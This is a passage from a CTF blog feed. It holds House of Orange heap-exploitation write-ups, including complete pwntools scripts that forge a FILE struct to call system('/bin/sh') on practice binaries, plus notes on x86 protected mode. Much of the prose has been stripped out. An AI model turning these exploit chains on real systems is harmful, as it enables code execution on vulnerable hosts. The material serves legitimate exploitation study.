class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,name,price=<span class="number">1</span>,color=<span class="number">0xddaa</span></span>):</span><br><span class="line">    ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    s(name)</span><br><span class="line">    ru(<span class="string">b&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(color).encode())</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x1f00000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27; house : &#x27;</span>)</span><br><span class="line">libcbase=uu64(r(<span class="number">6</span>))-<span class="number">0x3c5163</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">unsorted_bin=libcbase+<span class="number">0x68</span>+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">_IO_list_all=libcbase+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;unsotr&#x27;</span>,unsorted_bin)</span><br><span class="line">p(<span class="string">&#x27;iolist&#x27;</span>,_IO_list_all)</span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>+<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">heap=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(_IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># fake_file+=b&#x27;grxer666&#x27;</span></span><br><span class="line">fake_file+=p64(heap+<span class="number">0x508</span>+<span class="number">8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(system)</span><br><span class="line">payload+=fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Orange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016pwn450-note</title>
      <link href="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/"/>
      <url>/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1QEKd37yhK-vTDxViS76q5A">https://pan.baidu.com/s/1QEKd37yhK-vTDxViS76q5A</a><br>vbek</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; checksec ./16pwn450_note </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/io_file/16pwn450_note&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>512</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400B3B</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+17h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = v4++;</span><br><span class="line">    *(_BYTE *)(a1 + v1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)((<span class="type">int</span>)v4 + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br></pre></td></tr></table></figure><p></p><h2 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h2><p>mmaplibc</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230410000002101.png" alt="image-20230410000002101"></p><p>mmap128k</p><p><code>new(0x200000)#libcbase libcbase=int(rl(),16)+0x201000-0x10</code></p><p></p><h2 id="unsorted-bin-attack-amp-amp-house-of-orange"><a href="#unsorted-bin-attack-amp-amp-house-of-orange" class="headerlink" title="unsorted bin attack &amp;&amp; house of orange"></a>unsorted bin attack &amp;&amp; house of orange</h2><p>freetopchunkbintopchunkoldchunkunsortedbinunsortedbin0x60binsmall bin_chain</p><p><code>new(0x200) payload=b&#39;\x00&#39;*0x200+p64(0)+p64(0x10df1)</code></p><p>freechunkchunkunsortedbin</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231152136.png" alt="image-20230409231152136"></p><p><code>new(0x200)</code></p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231752579.png" alt="image-20230409231752579"></p><p></p><p><code>payload=b&#39;\x00&#39;*0x200+p64(0)+p64(0x10dd1)+p64(unsorted_bin)*2+b&#39;\x00&#39;*0x10db0+p64(0x10dd0)+p64(0x11) edit(payload)</code></p><p>unlinkchunkchunkprevsizeprevinuseunsortedbin </p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231532142.png" alt="image-20230409231532142"></p><p>unsortedbinFIFOunsorted<code>new(0x10d00)</code>0x200 small binsmallbins</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231930232.png" alt="image-20230409231930232"></p><p>free</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409232347124.png" alt="image-20230409232347124"></p><p>smallbinhouse of orange</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409234910775.png" alt="image-20230409234910775"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10d11</span>)+p64(heap+<span class="number">0x210</span>)+p64(unsorted_bin)+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x10d10</span>-<span class="number">0x20</span>)<span class="comment">#</span></span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(unsorted_bin)+p64(_IO_list_all-<span class="number">0x10</span>)<span class="comment">#orange</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#write base</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#write ptr </span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xc0</span>-<span class="number">48</span>) <span class="comment"># c0 mode</span></span><br><span class="line">payload+=p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#mode=-1</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xd8</span>-<span class="number">8</span>-<span class="number">0xc0</span>)<span class="comment">#_vtable</span></span><br><span class="line">payload+=p64(heap+<span class="number">0x10ff8</span>+<span class="number">8</span>)<span class="comment">#vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(system)</span><br></pre></td></tr></table></figure><p>unsortedbin60unsortedbinbk-&gt;fd&#x3D;unsortedbinsmallbin 0x60</p><p></p><p><code>payload+=p64(heap+0x10ff8+8)</code> 0x10+0x200+0x10d10+0xd8+8&#x3D;0x1 1000 0x10heapheapchunkhead+8</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409235134812.png" alt="image-20230409235134812"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd2510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &quot;\377\377\377\377&quot;, &#x27;\000&#x27; &lt;repeats 15 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x614000</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_jump_t*)0x614000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x1, </span><br><span class="line">  __overflow = 0x7ffff7a523a0 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409235705003.png" alt="image-20230409235705003"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./16pwn450_note&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libcelf=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;on---&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;on---&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">new(<span class="number">0x200000</span>)<span class="comment">#libcbase</span></span><br><span class="line">libcbase=<span class="built_in">int</span>(rl(),<span class="number">16</span>)+<span class="number">0x201000</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">unsorted_bin=libcbase+<span class="number">0x68</span>+libcelf.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">_IO_list_all=libcbase+libcelf.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system=libcbase+libcelf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;unsotr&#x27;</span>,unsorted_bin)</span><br><span class="line">p(<span class="string">&#x27;iolist&#x27;</span>,_IO_list_all)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">free()</span><br><span class="line"><span class="comment">#unsortedbin</span></span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10df1</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">free()</span><br><span class="line">new(<span class="number">0x15000</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10dd1</span>)+p64(unsorted_bin)*<span class="number">2</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10db0</span>+p64(<span class="number">0x10dd0</span>)+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment"># smallbin</span></span><br><span class="line">new(<span class="number">0x10d00</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">heap=<span class="built_in">int</span>(rl(),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10d11</span>)+p64(heap+<span class="number">0x210</span>)+p64(unsorted_bin)+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x10d10</span>-<span class="number">0x20</span>)<span class="comment">#</span></span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(unsorted_bin)+p64(_IO_list_all-<span class="number">0x10</span>)<span class="comment">#orange</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#write base</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#write ptr </span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xc0</span>-<span class="number">48</span>) <span class="comment"># c0 mode</span></span><br><span class="line">payload+=p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#mode=-1</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xd8</span>-<span class="number">8</span>-<span class="number">0xc0</span>)<span class="comment">#_vtable</span></span><br><span class="line">payload+=p64(heap+<span class="number">0x10ff8</span>+<span class="number">8</span>)<span class="comment">#vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(system)</span><br><span class="line">edit(payload)</span><br><span class="line">b()</span><br><span class="line">free()</span><br><span class="line">new(<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Orange </tag>
            
            <tag> Unsorted Bin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IA-32 x86(Protected mode)</title>
      <link href="/2023/04/08/32bit-x86-protected-mode/"/>
      <url>/2023/04/08/32bit-x86-protected-mode/</url>
      
        <content type="html"><![CDATA[<h1 id="IA-32-x86-Protected-mode"><a href="#IA-32-x86-Protected-mode" class="headerlink" title="IA-32 x86 Protected mode"></a>IA-32 x86 Protected mode</h1><h2 id="Real-address-Mode"><a href="#Real-address-Mode" class="headerlink" title="Real-address Mode"></a>Real-address Mode</h2><p>Real modex86ancestor 8086</p><p>&gt;&gt;&gt;cs ds es ss?</p><ul><li><p>80862016bit:4bit20bit1620,161664KB</p></li><li><p>(),:</p></li></ul><p><code>physicaladdress=segment * 16 + offset</code></p><p>32</p><p><strong></strong></p><ol><li>MMU</li><li></li></ol><h2 id="Protected-mode"><a href="#Protected-mode" class="headerlink" title="Protected mode"></a>Protected mode</h2><p>80286(16)80386(32)</p><p>80386 324GBIA-32(Intel Architecture)</p><p>flat memory model02^32-1</p><p>CROPE(Protection Enable)1</p><p>&gt;&gt;&gt;</p><p>16(1680,(16)(32)(32))</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>(segment descriptor)8</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420200038198.png" alt="image-20230420200038198"></p><ul><li>32</li><li>20,,(DNA:segmentation fault)</li><li>G(Granularity)G01(1B~1M)4k(4K~4G)</li><li>S(System)S&#x3D;0S&#x3D;1</li><li>DPL(Descriptor Privilege Level0-30,DPL(CPL)</li><li>TYPES</li></ul><p> CPU </p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195852680.png" alt="image-20230420195852680"></p><p>80286</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420200152426.png" alt="image-20230420200152426"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>cpuGlobal Descriptor TableGDTLDT(Local descriptor table)</p><p>()GDTRLDTRcpu</p><h4 id="GDTR"><a href="#GDTR" class="headerlink" title="GDTR"></a>GDTR</h4><p>48</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230408155337790.png" alt="image-20230408155337790"></p><p>3216(01)byte2^16&#x2F;8&#x3D;8192</p><h4 id="LDTR"><a href="#LDTR" class="headerlink" title="LDTR"></a>LDTR</h4><p>LDTRLDTGDT</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p></p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230408172110614.png" alt="image-20230408172110614"></p><ul><li>TItable indicatorTI&#x3D;0TI&#x3D;1</li><li>13TI</li><li>RPLRequestor Privilege Levelcpl0rpl303</li><li>(cs(ss)[csss]RPL(Current Privilege LevelCPL))DPLcpu</li></ul><p>GDTR</p><p> Descriptor Cache Registers ), CPU </p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420200014884.png" alt="image-20230420200014884"></p><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><p>RISClinux00xfffff4G</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230408194444921.png" alt="image-20230408194444921"></p><ul><li><p>BDF3F</p></li><li><p></p></li><li><p></p></li><li><p></p></li></ul><p></p><p>linux4kpage outpage in8k4k4k</p><p></p><p>CROPG1</p><p><strong>,</strong></p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195713371.png" alt="image-20230420195713371"></p><p>CR3</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>2^2044k120((PDE&amp;PTE))</p><p>2012</p><p>2^2044Mn4*nM</p><h4 id="32"><a href="#32" class="headerlink" title="32"></a>32</h4><p><strong></strong></p><p>CR0PG1CR4PAE0Page Directory TablePage Table<br>4K10241K4(Page-Table EntryPTE)</p><p>10241024*4KB&#x3D;4MB10241024*4MB&#x3D;4GB,4G</p><p></p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195930886.png" alt="image-20230420195930886"></p><p></p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195952065.png" alt="image-20230420195952065"></p><p></p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420191045242.png" alt="image-20230420191045242"></p><ol><li>CR3,10x4(4x4)</li><li>(20)120</li><li>122110x4</li><li></li><li>12</li></ol><blockquote><p>4k10244k4M4k</p><p></p><ol><li>PP0</li><li>4M</li><li>4k</li></ol></blockquote><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="64linux"><a href="#64linux" class="headerlink" title="64linux"></a>64linux</h2><p>64linux</p><ul><li>PGDpage Global directory(47-39), </li><li>PUDPage Upper Directory(38-30)</li><li>PMDpage middle directory(29-21)</li><li>PTEpage table entry(20-12)</li></ul><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230826213151091.png" alt="image-20230826213151091"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Protected Mode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House Of Orange 2.23 and below</title>
      <link href="/2023/04/06/House-of-orange/"/>
      <url>/2023/04/06/House-of-orange/</url>
      
        <content type="html"><![CDATA[<h2 id="House-Of-Orange-glibc-version-2-23-and-below"><a href="#House-Of-Orange-glibc-version-2-23-and-below" class="headerlink" title="House Of Orange glibc version 2.23 and below"></a>House Of Orange glibc version 2.23 and below</h2><p>freeheap attack</p><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">FILE struct size: 0xd8</span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">chain - fp: 0x68</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">mode - fp: 0xc0</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">write_ptr - fp: 0x28</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">write_base - fp: 0x20</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">vtable_offset - fp: 0x82</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">read_ptr - fp: 0x8</span></span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>top chunk  top chunkunsorted bin free  unsorted bins</p><p>_int_malloc fastbinsmall binsunsorted binlarge bins ,topchunk,</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sysmalloc mmap  brk brk chunk  mmap  128K</p><p>brktop chunk size </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + 